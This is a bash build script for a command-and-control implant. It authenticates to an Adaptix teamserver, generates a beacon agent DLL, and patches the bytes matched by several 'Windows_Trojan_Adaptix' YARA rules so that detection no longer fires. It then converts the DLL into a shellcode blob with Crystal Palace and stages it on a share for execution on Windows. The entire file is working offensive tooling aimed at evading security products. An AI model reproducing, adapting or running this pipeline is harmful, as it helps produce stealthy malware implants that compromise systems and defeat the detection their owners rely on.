#!/usr/bin/env bash
set -euo pipefail

usage() {
    cat <<EOF
Usage: ./build.sh [options]

Options:
  --url  <url>       Teamserver URL      (default: \$AX_HOST or https://127.0.0.1:4321)
  -u     <user>      Username            (default: \$AX_USER or operator1)
  -p     <pass>      Password            (default: \$AX_PASS or changeme)
  -l     <listener>  Listener name       (default: https-testo)
  -d     <seconds>   Check-in delay 0-86400 (default: \$INITIAL_CHECKIN_DELAY_SECONDS or 0)
  -s     <path>      Share directory     (default: \$SHARE or /mnt/share)
  -h                 Show this help
EOF
    exit 0
}

BK_DIR="$(cd "$(dirname "$0")" && pwd)"
CPL="java -jar $BK_DIR/crystalpalace.jar"
RUNNER="$BK_DIR/tests/build/runner.exe"
OUTPUT="$BK_DIR/output"

# Defaults from env, overridden by flags
AX_HOST="${AX_HOST:-https://127.0.0.1:4321}"
AX_USER="${AX_USER:-operator1}"
AX_PASS="${AX_PASS:-changeme}"
SHARE="${SHARE:-/mnt/share}"
LISTENER="https-testo"
INITIAL_CHECKIN_DELAY_SECONDS="${INITIAL_CHECKIN_DELAY_SECONDS:-0}"

while [[ $# -gt 0 ]]; do
    case "$1" in
        --url) AX_HOST="$2"; shift 2 ;;
        -u)    AX_USER="$2"; shift 2 ;;
        -p)    AX_PASS="$2"; shift 2 ;;
        -l)    LISTENER="$2"; shift 2 ;;
        -d)    INITIAL_CHECKIN_DELAY_SECONDS="$2"; shift 2 ;;
        -s)    SHARE="$2"; shift 2 ;;
        -h)    usage ;;
        *)     echo "Unknown option: $1" >&2; usage ;;
    esac
done

if [[ ! "$INITIAL_CHECKIN_DELAY_SECONDS" =~ ^[0-9]+$ ]]; then
    echo "[-] INITIAL_CHECKIN_DELAY_SECONDS must be between 0 and 86400" >&2
    exit 1
fi
INITIAL_CHECKIN_DELAY_SECONDS="$((10#$INITIAL_CHECKIN_DELAY_SECONDS))"
if (( INITIAL_CHECKIN_DELAY_SECONDS > 86400 )); then
    echo "[-] INITIAL_CHECKIN_DELAY_SECONDS must be between 0 and 86400" >&2
    exit 1
fi

AX_EP="$AX_HOST/endpoint"

mkdir -p "$OUTPUT"

# 1. Compile
echo "[*] Compiling barrel-kit..."
make -C "$BK_DIR" \
  INITIAL_CHECKIN_DELAY_SECONDS="$INITIAL_CHECKIN_DELAY_SECONDS" \
  clean all 2>&1 | sed 's/^/    /'

# 2. Auth
echo "[*] Authenticating..."
TOKEN=$(curl -sk "$AX_EP/login" \
  -H "Content-Type: application/json" \
  -d "{\"username\":\"$AX_USER\",\"password\":\"$AX_PASS\"}" \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['access_token'])")
echo "[+] Got token"

# 3. Build agent DLL
echo "[*] Building agent DLL (listener: $LISTENER)..."
export LISTENER OUTPUT
python3 -c "
import json, os
config = json.dumps({
    'arch':'x64','format':'DLL','sleep':'4s','jitter':0,
    'is_killdate':False,'is_workingtime':False,'iat_hiding':False,
    'is_sideloading':False,'use_proxy':False,'rotation_mode':'sequential'
})
print(json.dumps({
    'agent':'beacon','listener_name':[os.environ['LISTENER']],
    'config':config,'save_to_store':False
}))
" | curl -sk -X POST "$AX_EP/agent/generate" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d @- \
  | python3 -c "
import sys, json, base64, os
data = json.load(sys.stdin)
if not data.get('ok', False):
    print(f'[-] Build failed: {data}'); sys.exit(1)
parts = data['message'].split(':', 1)
content = base64.b64decode(parts[1])
outdir = os.environ['OUTPUT']
with open(f'{outdir}/agent.x64.dll', 'wb') as f:
    f.write(content)
print(f'[+] Agent DLL: {len(content)} bytes')
"

# 4. Scrub embedded Adaptix signatures
echo "[*] Scrubbing Adaptix signatures..."
SCRUBBED_DLL="$OUTPUT/agent.x64.scrubbed.dll"
python3 - "$OUTPUT/agent.x64.dll" "$SCRUBBED_DLL" <<'PY'
from pathlib import Path
import sys


def hex_pattern(expression):
    return [None if token == "??" else int(token, 16)
            for token in expression.split()]


patterns = {
    "Windows_Trojan_Adaptix_2779784c:$a1": hex_pattern(
        "48 81 EC A8 01 00 00 48 8B 84 24 C0 01 00 00 48 C7 00 00 00 00 00 48 8B 84 24 C0 01 00 00 48 C7 40 08 00 00 00 00 48 8B 84 24 C0 01 00 00 48 C7 40 10 00 00 00 00 48 8B 84 24 C0 01 00 00 48 C7"
    ),
    "Windows_Trojan_Adaptix_2779784c:$a2": hex_pattern(
        "48 83 EC 58 48 8B 4C 24 70 E8 ?? ?? ?? ?? 89 44 24 38 C7 44 24 34 00 00 00 00 48 8D 54 24 34 48 8B 4C 24 70 E8 ?? ?? ?? ?? 48 89 44 24 40 48 8B 4C 24 70 E8 ?? ?? ?? ?? 66 89 44 24 30"
    ),
    "Windows_Trojan_Adaptix_b2cda978:$a1": hex_pattern(
        "48 89 03 8B 45 EC 48 98 48 8D 14 C5 00 00 00 00 48 8B 45 20 48 01 D0 48 8B 00 48 85 C0 75 15 48 8B 45 E0 8B 40 10 85 C0 74 0A B8 00 00 00 00"
    ),
    "Windows_Trojan_Adaptix_b2cda978:$a2": hex_pattern(
        "48 89 45 D0 48 8B 4D 10 E8 4C 9F 00 00 89 C2 48 8D 85 C0 FB FF FF 49 89 D0 BA 00 00 00 00 48 89 C1 E8 D5 DE FF FF 48 83 7D D0 00 74 11 8B 55 E8 48 8B 45 D0 48 89 C1"
    ),
    "Windows_Trojan_Adaptix_b2cda978:$a3": hex_pattern(
        "8B 53 54 48 89 C6 31 C0 48 39 C2 74 0B 8A 0C 07 88 0C 06 48 FF C0 EB F0 0F B7 43 14 0F B7 4B 06 48 8D 44 03 18 48 83 E9 01 72 2C 44 8B 40 0C 44 8B 48 14 31 D2 44 8B 50 10 49 01 F0 49 01 F9 49"
    ),
    "Windows_Trojan_Adaptix_b2cda978:$a4": hex_pattern(
        "48 89 45 E0 48 83 7D E0 00 75 17 41 B8 00 00 00 00 BA 00 00 00 00 B9 05 01 00 00 E8 27 E8 FF FF EB 63 4C 8B 4D D0 4C 8D 85 00 FF FF FF 48 8B 55 D8 48 8B 45 20 48 8B 4D E0 48 89 4C 24 20 48 89"
    ),
    "Windows_Trojan_Adaptix_b2cda978:$a5": hex_pattern(
        "48 83 EC 10 89 4D 10 C7 ?? ?? ?? ?? ?? ?? 8B 45 10 89 45 F8 48 8D 45 FC 0F B6 00 3C DD 75 37 48 8D 45 F8 0F B6 55 13 88 10 48 8D 45 F8 48 83 C0 01 0F B6 55 12 88 10 48 8D 45 F8 48 83 C0 02"
    ),
}

patches = {
    "Windows_Trojan_Adaptix_b2cda978:$a1": (
        bytes.fromhex("48 85 C0"), bytes.fromhex("48 09 C0")),
    "Windows_Trojan_Adaptix_b2cda978:$a5": (
        bytes.fromhex("48 83 C0 01"), bytes.fromhex("48 8D 40 01")),
}


def find_matches(data, pattern):
    width = len(pattern)
    return [
        offset for offset in range(len(data) - width + 1)
        if all(expected is None or data[offset + index] == expected
               for index, expected in enumerate(pattern))
    ]


source = Path(sys.argv[1])
destination = Path(sys.argv[2])
data = bytearray(source.read_bytes())
if data[:2] != b"MZ":
    raise SystemExit("generated agent is not a PE file")

patched = 0
for name, (before, after) in patches.items():
    pattern = patterns[name]
    for match_offset in find_matches(data, pattern):
        span = bytes(data[match_offset:match_offset + len(pattern)])
        relative = span.find(before)
        if relative < 0 or span.find(before, relative + 1) >= 0:
            raise SystemExit(f"replacement anchor is not unique for {name}")
        patch_offset = match_offset + relative
        data[patch_offset:patch_offset + len(before)] = after
        patched += 1

remaining = [name for name, pattern in patterns.items()
             if find_matches(data, pattern)]
if remaining:
    raise SystemExit("unhandled YARA matches: " + ", ".join(remaining))

destination.write_bytes(data)
print(f"[+] YARA scrubbed {patched} match(es)")
PY

# 5. Link with Crystal Palace
echo "[*] Linking with Crystal Palace..."
rm -f "$OUTPUT/agent.x64.bin"
$CPL link "$BK_DIR/loader.spec" "$SCRUBBED_DLL" "$OUTPUT/agent.x64.bin"
SIZE=$(stat -c%s "$OUTPUT/agent.x64.bin")
echo "[+] PIC blob: $OUTPUT/agent.x64.bin ($SIZE bytes)"

# 6. Deploy
if [ -d "$SHARE" ]; then
    cp "$OUTPUT/agent.x64.bin" "$SHARE/"
    [ -f "$RUNNER" ] && cp "$RUNNER" "$SHARE/"
    echo "[+] Copied to $SHARE"
else
    echo "[!] Share not mounted at $SHARE - copy manually"
fi

echo ""
echo "=== Ready ==="
echo "On Windows: runner.exe agent.x64.bin"
